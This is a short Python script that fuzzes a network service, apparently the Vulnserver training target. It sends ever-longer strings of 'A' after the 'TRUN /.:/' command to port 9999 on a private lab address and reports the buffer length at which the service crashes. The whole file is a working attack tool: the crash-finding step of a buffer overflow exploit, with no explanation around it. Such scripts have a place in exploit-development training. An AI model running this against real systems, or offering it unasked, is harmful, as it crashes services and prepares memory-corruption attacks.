import socket
import time
import sys


numberOfCharacters = 100
stringToSend = "TRUN /.:/" + "A" * numberOfCharacters


while True:
    try:
        mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        mySocket.connect(("10.0.2.15",9999))
        bytess = stringToSend.encode(encoding="latin-1")
        mySocket.send(bytess)
        mySocket.close()
        stringToSend = stringToSend + "A" * numberOfCharacters
        time.sleep(1)

        
    except KeyboardInterrupt:
        print("Crashed : " + str(len(stringToSend)))
        sys.exit()
    except Exception as e:
        print("Crashed : " + str(len(stringToSend)))
        print(e)
        sys.exit()



